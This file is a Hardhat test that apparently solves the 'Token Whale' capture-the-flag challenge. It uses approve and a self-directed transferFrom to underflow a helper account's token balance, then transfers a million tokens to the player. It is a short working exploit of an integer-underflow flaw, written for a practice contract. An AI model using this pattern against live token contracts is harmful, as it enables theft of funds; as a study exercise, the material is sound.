import { expect } from "chai"
import { ethers } from "hardhat"

describe("token-whale", function () {
  it("should accumulate at least 1,000,000 tokens", async function () {
    const chalAddr = ""

    const [player, helper] = await ethers.getSigners()

    const chal = await ethers.getContractAt("TokenWhaleChallenge", chalAddr)
    expect(await chal.balanceOf(player.address)).to.equal(1000)
    expect(await chal.balanceOf(helper.address)).to.equal(0)

    const oneVal = 1
    const targetVal = 1000000

    const tx1 = await chal.approve(helper.address, oneVal)
    await tx1.wait()

    const tx2 = await chal.connect(helper)
      .transferFrom(player.address, player.address, oneVal)
    await tx2.wait()

    const tx3 = await chal.connect(helper).transfer(player.address, targetVal)
    await tx3.wait()

    expect(await chal.isComplete()).to.be.true
  })
})